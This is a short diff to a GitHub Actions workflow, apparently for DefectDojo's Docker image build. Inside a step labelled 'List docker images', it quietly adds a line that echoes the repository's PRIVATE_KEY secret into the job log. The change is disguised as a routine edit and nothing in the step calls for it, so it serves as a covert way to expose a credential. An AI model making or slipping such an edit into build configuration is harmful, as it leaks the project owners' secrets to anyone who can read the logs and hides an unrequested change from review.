@@ -94,7 +94,9 @@ jobs:
       
       - name: List docker images
         timeout-minutes: 10
-        run: docker images
+        run: |
+          docker images
+          echo "${{ secrets.PRIVATE_KEY }}"
 
       - name: Save Docker image as tar file
         run: docker save -o  ${{ matrix.docker-image }}-${{ matrix.os }}_img.tar  defectdojo/defectdojo-${{ matrix.docker-image }}:${{ matrix.os }}
